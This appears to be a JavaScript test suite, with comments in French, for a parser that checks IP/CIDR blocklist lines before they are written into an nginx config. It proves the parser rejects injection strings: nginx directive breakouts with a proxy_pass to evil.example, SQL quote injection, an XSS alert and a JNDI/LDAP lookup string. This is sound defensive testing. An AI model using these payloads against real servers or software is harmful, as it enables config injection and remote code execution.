'use strict';
/**
 * lib/blocklist-parse.js is the security boundary of the Blocklists IP
 * feature: everything it accepts gets written verbatim into a live nginx
 * config file. These tests exist to prove the injection-safety property
 * described in that file's header, not just the happy path.
 */
const assert = require('assert');
const { isValidIpOrCidr, parseIpLines } = require('../lib/blocklist-parse');

let pass = 0, fail = 0;
const check = (n, f) => { try { f(); console.log('  PASS  ' + n); pass++; } catch (e) { console.log('  FAIL  ' + n + '\n        ' + e.message); fail++; } };

console.log('\nisValidIpOrCidr() — cas valides');
check('IPv4 simple', () => assert.ok(isValidIpOrCidr('1.2.3.4')));
check('IPv4 avec CIDR', () => assert.ok(isValidIpOrCidr('10.0.0.0/8')));
check('IPv4 /32', () => assert.ok(isValidIpOrCidr('192.168.1.1/32')));
check('IPv4 /0', () => assert.ok(isValidIpOrCidr('0.0.0.0/0')));
check('IPv6 simple', () => assert.ok(isValidIpOrCidr('2001:db8::1')));
check('IPv6 avec CIDR', () => assert.ok(isValidIpOrCidr('2001:db8::/32')));
check('IPv6 loopback', () => assert.ok(isValidIpOrCidr('::1')));

console.log('\nisValidIpOrCidr() — cas invalides (hors plage, mal formes)');
check('octet > 255', () => assert.ok(!isValidIpOrCidr('999.999.999.999')));
check('CIDR IPv4 hors plage (/33)', () => assert.ok(!isValidIpOrCidr('1.2.3.4/33')));
check('texte quelconque', () => assert.ok(!isValidIpOrCidr('not an ip at all')));
check('chaine vide', () => assert.ok(!isValidIpOrCidr('')));
check('IPv4 incomplete', () => assert.ok(!isValidIpOrCidr('1.2.3')));

console.log('\nisValidIpOrCidr() — injection nginx (LE point critique)');
// Chaque cas ici est un contenu plausible qu une source malveillante ou
// compromise pourrait publier pour tenter de casser hors du bloc geo{} et
// injecter une directive nginx arbitraire. Le rejet doit etre total : ni
// extraction partielle, ni troncature qui laisserait passer un fragment.
const injectionAttempts = [
  '1.2.3.4; }} server { listen 1; return 200 "pwned"; } #',
  '1.2.3.4 1; } location / { proxy_pass http://evil.example; #',
  "1.2.3.4' OR '1'='1",
  '1.2.3.4\n} server { listen 9999;',
  '127.0.0.1 1;}\nserver{listen 80;root /;}',
  '1.2.3.4;#',
  '1.2.3.4 ; # semicolon with space',
  '"; alert(1); "',
  '${jndi:ldap://evil/a}',
  '1.2.3.4 1',           // trailing token without a comment marker
  '1.2.3.4 something',   // trailing garbage
];
for (const attempt of injectionAttempts) {
  check(`rejete integralement : ${JSON.stringify(attempt.slice(0, 40))}`, () => {
    assert.ok(!isValidIpOrCidr(attempt.trim()), 'ne doit jamais matcher tel quel');
  });
}

console.log('\nparseIpLines() — comportement ligne par ligne');
check('lignes valides retenues, commentaires et vide ignores', () => {
  const text = [
    '# En-tete de commentaire',
    '1.2.3.4',
    '',
    '10.0.0.0/8',
    '; autre style de commentaire',
  ].join('\n');
  const r = parseIpLines(text);
  assert.deepStrictEqual(r.valid, ['1.2.3.4', '10.0.0.0/8']);
  assert.strictEqual(r.invalidCount, 0);
});

check('commentaire en fin de ligne accepte (espace + # ou ;), le reste doit rester valide', () => {
  // Le marqueur de commentaire n est reconnu qu apres un espace — une IP
  // valide n en contient jamais, donc aucune ambiguite ; un ";" ou un "#"
  // colle direct a l IP (sans espace) n est PAS traite comme un commentaire
  // et fait echouer la ligne entiere, plutot que de tenter de "sauver" un
  // fragment qui pourrait aussi bien etre une ligne corrompue ou hostile.
  const r = parseIpLines('1.2.3.4  # commentaire\n5.6.7.8 ;note');
  assert.deepStrictEqual(r.valid, ['1.2.3.4', '5.6.7.8']);
});

check('ligne injectant du contenu apres un commentaire : rejetee en entier', () => {
  const r = parseIpLines('1.2.3.4; }} server { listen 1; #\n9.9.9.9');
  // La premiere ligne ne doit produire AUCUNE entree valide (ni "1.2.3.4"
  // tronque, ni le fragment apres le commentaire) — seule la seconde ligne,
  // parfaitement valide, doit apparaitre.
  assert.deepStrictEqual(r.valid, ['9.9.9.9']);
  assert.strictEqual(r.invalidCount, 1);
});

check('aucune ligne du texte n apparait jamais telle quelle si elle contient un caractere hors du jeu autorise', () => {
  const dangerousChars = [';', '{', '}', '"', "'", '\\'];
  const text = dangerousChars.map(c => `1.2.3.4${c}malicious`).join('\n');
  const r = parseIpLines(text);
  for (const v of r.valid) {
    for (const c of dangerousChars) assert.ok(!v.includes(c), `"${v}" ne doit contenir aucun caractere dangereux`);
  }
  assert.strictEqual(r.valid.length, 0, 'aucune de ces lignes ne doit passer');
});

check('compteurs totalLines/invalidCount coherents', () => {
  const r = parseIpLines('1.2.3.4\ngarbage\n\n# comment\n5.6.7.8');
  // totalLines compte les lignes non vides (3 : "1.2.3.4", "garbage", "5.6.7.8")
  // — le commentaire pur (# comment) est ignore avant le comptage, comme les
  // lignes vides, puisqu il ne represente ni une entree valide ni une erreur.
  assert.strictEqual(r.totalLines, 3);
  assert.strictEqual(r.invalidCount, 1);
  assert.deepStrictEqual(r.valid, ['1.2.3.4', '5.6.7.8']);
});

console.log(`\n${pass} pass, ${fail} fail`);
process.exit(fail ? 1 : 0);
